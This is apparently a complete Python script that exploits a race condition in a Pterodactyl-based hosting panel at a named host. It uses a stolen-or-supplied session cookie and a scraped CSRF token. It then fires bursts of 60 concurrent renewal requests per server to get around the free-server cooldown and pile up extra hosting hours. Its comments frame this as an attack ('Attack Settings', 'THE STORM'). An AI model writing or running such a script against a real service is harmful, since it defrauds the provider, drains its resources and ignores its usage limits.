import aiohttp
import asyncio
import sys
import random
import re
import os
import json

# === CONFIGURATION ===
BASE_URL = "https://gpanel.eternalzero.cloud"

# Read the cookie from GitHub Secrets
RAW_COOKIE = os.environ.get("ETERNAL_COOKIE")

if not RAW_COOKIE:
    print("[!] FATAL ERROR: ETERNAL_COOKIE environment variable is not set.")
    sys.exit(1)

# === SMART COOKIE REPAIR ===
# If the user pasted just the value "eyJ...", we prepend the key name.
if "pterodactyl_session" not in RAW_COOKIE:
    print("[*] Detected raw cookie value. Prepending 'pterodactyl_session='...")
    COOKIE_STRING = f"pterodactyl_session={RAW_COOKIE}"
else:
    COOKIE_STRING = RAW_COOKIE

# Attack Settings
BURST_SIZE = 60
TIMEOUT = 15

# === HEADER FACTORY ===
def get_headers(csrf_token=None, referer=None):
    h = {
        'authority': 'gpanel.eternalzero.cloud',
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': BASE_URL,
        'x-requested-with': 'XMLHttpRequest',
        'cookie': COOKIE_STRING, # Force the cookie header
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }
    if csrf_token:
        h['x-csrf-token'] = csrf_token
    if referer:
        h['referer'] = referer
    return h

# === STEP 1: LOGIN & GET CSRF ===
async def get_csrf_token(session):
    print("[*] Connecting to Dashboard...")
    try:
        # Request HTML to find the token
        headers = get_headers()
        headers['accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        
        async with session.get(BASE_URL, headers=headers) as resp:
            text = await resp.text()

            # CHECK: Are we actually logged in?
            if "login" in str(resp.url) or "Sign in to" in text:
                print("\n[!] AUTHENTICATION FAILED [!]")
                print("    The server redirected us to the Login Page.")
                print("    Your ETERNAL_COOKIE is invalid. Please get a fresh one.")
                sys.exit(1)

            if resp.status == 200:
                match = re.search(r'<meta name="csrf-token" content="([^"]+)">', text)
                if match:
                    token = match.group(1)
                    print(f"[+] Authenticated. Token: {token[:15]}...")
                    return token
                else:
                    print("[!] Could not find CSRF token in HTML.")
            else:
                print(f"[!] Dashboard load failed: {resp.status}")
    except Exception as e:
        print(f"[!] Connection error: {e}")
    return None

# === STEP 2: GET SERVERS ===
async def get_server_list(session, csrf_token):
    print("[*] Fetching server list...")
    servers = []
    try:
        # We hit /api/client to get the JSON list you provided
        async with session.get(f"{BASE_URL}/api/client", headers=get_headers(csrf_token)) as resp:
            if resp.status == 200:
                data = await resp.json()
                for item in data['data']:
                    attr = item['attributes']
                    servers.append({
                        'name': attr['name'],
                        'uuid': attr['uuid'],      # Long UUID
                        'short': attr['identifier'] # Short UUID
                    })
                print(f"[+] Found {len(servers)} servers.")
                return servers
            else:
                print(f"[!] API Error: {resp.status}")
                print(f"    Response: {await resp.text()}")
    except Exception as e:
        print(f"[!] Error fetching list: {e}")
    return []

# === STEP 3: THE STORM ===
async def storm_server(session, server, csrf_token):
    target_url = f"{BASE_URL}/api/client/freeservers/{server['uuid']}/renew"
    print(f"\n[>>>] TARGET: {server['name']} ({server['short']})")
    
    headers = get_headers(csrf_token, referer=f"{BASE_URL}/server/{server['short']}")
    
    tasks = []
    for i in range(BURST_SIZE):
        tasks.append(fire_shot(session, target_url, headers))
    
    print(f"      FIRING {BURST_SIZE} REQUESTS...")
    results = await asyncio.gather(*tasks)
    
    hits = results.count(True)
    if hits > 0:
        print(f"[$$$] SUCCESS! Added +{hits * 4} Hours")
    else:
        print(f"[---] Failed (Cooldown active or blocked)")

async def fire_shot(session, url, headers):
    try:
        async with session.post(url, json={}, headers=headers, params={'z': random.random()}) as resp:
            await resp.read()
            return resp.status in [200, 201]
    except:
        return False

# === MAIN ===
async def main():
    connector = aiohttp.TCPConnector(limit=0, force_close=True)
    # We pass an empty session because we are forcing headers manually
    async with aiohttp.ClientSession(connector=connector) as session:
        
        token = await get_csrf_token(session)
        if not token: return

        servers = await get_server_list(session, token)
        if not servers: return

        print("-" * 40)
        for server in servers:
            await storm_server(session, server, token)
            await asyncio.sleep(1) 
        print("-" * 40)
        print("[*] DONE.")

if __name__ == "__main__":
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(main())
